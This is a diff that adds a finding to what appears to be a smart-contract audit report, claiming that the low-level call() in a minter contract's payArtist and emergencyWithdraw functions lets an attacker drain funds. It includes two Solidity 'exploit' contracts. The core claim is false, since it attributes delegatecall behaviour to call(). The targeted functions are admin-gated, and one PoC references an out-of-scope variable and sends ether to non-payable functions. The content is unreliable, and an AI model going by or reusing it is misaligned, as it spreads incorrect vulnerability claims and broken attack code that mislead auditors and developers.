@@ -796,3 +796,124 @@ bytes => bytes32 casting occurs in gencoreContract.setTokenHash(tokenIdToCollect
 VS Code.
 ## Recommended Mitigation Steps
 Use clear constants.
+## [L-15] Controlled low level call
+## Impact
+The contract is using call() which is accepting address controlled by a user. 
+This can have devastating effects on the contract as a call allows the contract to execute code belonging to other contracts but using it’s own storage. 
+This can very easily lead to a loss of funds and compromise of the contract.
+
+## Proof of Concept
+**Vulnerable payArtist function**
+```sol
+// Ln 415-444
+    function payArtist(uint256 _collectionID, address _team1, address _team2, uint256 _teamperc1, uint256 _teamperc2) public FunctionAdminRequired(this.payArtist.selector) {
+        require(collectionArtistPrimaryAddresses[_collectionID].status == true, "Accept Royalties");
+        require(collectionTotalAmount[_collectionID] > 0, "Collection Balance must be grater than 0");
+        require(collectionRoyaltiesPrimarySplits[_collectionID].artistPercentage + _teamperc1 + _teamperc2 == 100, "Change percentages");
+        uint256 royalties = collectionTotalAmount[_collectionID];
+        collectionTotalAmount[_collectionID] = 0;
+        address tm1 = _team1;
+        address tm2 = _team2;
+        uint256 colId = _collectionID;
+        uint256 artistRoyalties1;
+        uint256 artistRoyalties2;
+        uint256 artistRoyalties3;
+        uint256 teamRoyalties1;
+        uint256 teamRoyalties2;
+        artistRoyalties1 = royalties * collectionArtistPrimaryAddresses[colId].add1Percentage / 100;
+        artistRoyalties2 = royalties * collectionArtistPrimaryAddresses[colId].add2Percentage / 100;
+        artistRoyalties3 = royalties * collectionArtistPrimaryAddresses[colId].add3Percentage / 100;
+        teamRoyalties1 = royalties * _teamperc1 / 100;
+        teamRoyalties2 = royalties * _teamperc2 / 100;
+        (bool success1, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd1).call{value: artistRoyalties1}("");
+        (bool success2, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd2).call{value: artistRoyalties2}("");
+        (bool success3, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd3).call{value: artistRoyalties3}("");
+        (bool success4, ) = payable(tm1).call{value: teamRoyalties1}("");
+        (bool success5, ) = payable(tm2).call{value: teamRoyalties2}("");
+        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd1, success1, artistRoyalties1);
+        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd2, success2, artistRoyalties2);
+        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd3, success3, artistRoyalties3);
+        emit PayTeam(tm1, success4, teamRoyalties1);
+        emit PayTeam(tm2, success5, teamRoyalties2);
+    }
+```
+**Exploit payArtist function with low level call**
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity >=0.8.19;
+
+import "./MinterContract.sol";
+
+contract tMinterContract {
+
+   MinterContract public x1;
+
+   address me = address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);
+
+   constructor(MinterContract _x1) {
+
+      x1 = MinterContract(_x1);
+
+   }
+   
+   function testlowCalE() public payable {
+
+      x1.payArtist{value: 2 ether}(uint256(4), address(_x1), address(me), uint256(10), uint256(20));
+
+   }
+
+   receive() external payable {}
+
+   }
+```
+**Vulnerable emergencyWithdraw function**
+```sol
+// Ln 461-466
+    function emergencyWithdraw() public FunctionAdminRequired(this.emergencyWithdraw.selector) {
+        uint balance = address(this).balance;
+        address admin = adminsContract.owner();
+        (bool success, ) = payable(admin).call{value: balance}("");
+        emit Withdraw(msg.sender, success, balance);
+    }
+```
+**Exploit emergencyWithdraw function with low level call**
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity >=0.8.19;
+
+import "./MinterContract.sol";
+
+contract tMinterContract {
+
+   MinterContract public x1;
+
+   constructor(MinterContract _x1) {
+
+      x1 = MinterContract(_x1);
+
+   }
+   
+   function testlowCalF() public payable {
+
+      x1.emergencyWithdraw{value: 2 ether}();
+
+   }
+
+   receive() external payable {}
+
+   }
+```
+## Tools Used
+VS Code.
+## Recommended Mitigation Steps
+Do not allow user-controlled data inside the call() function.
+```sol
+// Ln 438
+        (bool success5, ) = payable(tm2).call{value: teamRoyalties2}("");
+```
+```sol
+// Ln 464
+        (bool success, ) = payable(admin).call{value: balance}("");
+```
